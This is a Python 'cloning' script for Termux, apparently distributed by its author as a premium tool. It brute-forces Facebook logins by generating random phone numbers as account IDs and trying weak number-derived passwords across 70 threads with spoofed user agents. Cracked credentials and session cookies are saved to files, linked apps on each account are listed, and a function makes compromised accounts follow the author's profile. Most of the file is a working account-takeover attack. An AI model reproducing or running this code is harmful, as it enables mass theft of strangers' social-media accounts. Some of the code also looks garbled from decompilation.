# ASSALAMUALAIKUM 
# SCRIPT NEOWAR JONNO THANKS 💙
#from os import system as TOXIC

import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
TOXIC = os.system
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu

try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/itz.TOXIC.mallik', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
#TOXIC('xdg-open https://www.facebook.com/msrtanim.py')
import os
TOXIC("pkg install espeak")

print("walcome to SEE MORE ETHICAL")
logo = ("""

  _______ ______   _______ _____ 
 |__   __/ __ \ \ / /_   _/ ____|
    | | | |  | \ V /  | || |     
    | | | |  | |> <   | || |     
    | | | |__| / . \ _| || |____ 
    |_|  \____/_/ \_\_____\_____|
                                 
                                 

\033[0;31m═════════════════════════════════════
\033[0;31m[♥] TOOLS TYPE:\033[0;31m PREMIUM
\033[0;31m[♥] VERSION   :\033[0;31m 1.1
\033[0;31m[♥] AUTHOR    :\033[0;31m MSRTanim
\033[0;31m[♥] GITHUB    :\033[0;31m MSRTanim
\033[0;31m[♥] FACEBOOK  :\033[0;31m MSRTanim1
\033[0;31m═════════════════════════════════════""")
os.system('espeak -a 300 "WELCOME TOXIC"')
def linex():
	print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
loop = 0
oks = []
cps = []

def clear():
    TOXIC('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    

def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :TOXIC = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :TOXIC = '√ 2009'
        elif uid[:8] in ['10000000']        :TOXIC = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:TOXIC = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:TOXIC = ' 2010'
        elif uid[:6] in ['100001']          :TOXIC = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :TOXIC = '√ 2011/2012'
        elif uid[:6] in ['100004']          :TOXIC = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :TOXIC = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :TOXIC = '√ 2014/2015'
        elif uid[:6] in ['100009']          :TOXIC = '√ 2015'
        elif uid[:5] in ['10001']           :TOXIC = '√ 2015/2016'
        elif uid[:5] in ['10002']           :TOXIC = '√ 2016/2017'
        elif uid[:5] in ['10003']           :TOXIC = '√ 2018/2019'
        elif uid[:5] in ['10004']           :TOXIC = '√ 2019/2020'
        elif uid[:5] in ['10005']           :TOXIC = '√ 2020'
        elif uid[:5] in ['10006','10007','']:TOXIC = '√ 2021'
        elif uid[:5] in ['10008']           :TOXIC = '√ 2022'
        elif uid[:5] in ['10009']           :TOXIC = '√ 2023'
        else:TOXIC=''
    elif len(uid) in [9,10]:
        TOXIC = ' √ 2008/2009'
    elif len(uid)==8:
        TOXIC = '√ 2007/2008'
    elif len(uid)==7:
        TOXIC = '√ 2006/2007'
    else:TOXIC=''
    return TOXIC   
    
# APK CHECK
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' \x1b[38;5;191m\x1b[38;5;191m Example : {xr} \x1b[38;5;193m 019, 017, 018, 92302, 92301, 91778{x}')
    print(" \033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    code = random.choice([rk1,rk2,rk3])                      
    pww = input(f' \033[1;91m\x1b[38;5;195m Choose : ')
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[1;91m\x1b[38;5;191m EXAMPLE :\x1b[38;5;194m 2000, 5000, 10000, 50000, 100000 \n \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××× \n \033[1;91m\x1b[38;5;195m PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"\033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=70) as manshera:
        clear()
        tl = str(len(user))
        print(f' \033[1;91m[\033[1;97m🔵\033[1;91m]\033[38;5;46m TOTAL IDS:\033[38;5;46m {xr}'+tl)
        print(f" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
        print("\033[38;5;46m┌━━━━━━━━━━━━━━━┐        \033[38;5;46m┌━━━━━━━━━━━━━━━━┐")
        print(f'\033[38;5;46m│ \033[38;5;46m𝙔𝙊𝙐𝙍 𝘾𝙃𝙊𝙄𝘾𝙀   \033[38;5;46m│       \033[38;5;46m │    \033[38;5;46m𝘾𝙇𝙊𝙉𝙀 \033[38;5;46m \033[38;5;46m     │ ')
        print(f"\033[38;5;46m│ \033[38;5;46m𝘾𝙍𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏  \033[38;5;46m │     \033[38;5;46m   │   \033[38;5;46m𝙏𝙄𝙈𝙀/{dt_string}  \033[38;5;46m\033[38;5;46m │")
        print("\033[38;5;46m└━━━━━━━━━━━━━━━┘      \033[38;5;46m  └━━━━━━━━━━━━━━━━┘\n")
        print(f" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} \033[38;5;46m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
           'authority': 'p.facebook.com',
           'method':'GET',
           'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
           'scheme':'https',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-US,en;q=0.9',
           'cache-control': 'max-age=0',
           'referer': 'https://p.facebook.com/',
           'sec-ch-prefers-color-scheme': 'light',
           'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
           'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-platform': '"Android"',
           'sec-ch-ua-platform-version': '"12.0.0"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'same-origin',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': pro,}         
            lo = session.post('https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8&rtime=1689670522&hrc=1&wtsid=rdr_0i0UwXcZpy7hurwvm&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[38;5;46m [TOXIC-OK💙] ' +uid+ ' | ' +ps+    '  \n \033[1;33m[√]\033[1;34mCookie = \033[38;5;46m'+coki+  '  ''  \033[1;34m')
                import os
                cek_apk(session,coki)
                import os
                open('/sdcard/TOXIC-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\x1b[38;5;196m [TOXIC-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/TOXIC-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;48m𓂀 TOXIC 𓂀{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
        #sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;48mERROR💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
       # sys.stdout.flush()
  #  except:
      #  pass
xxr()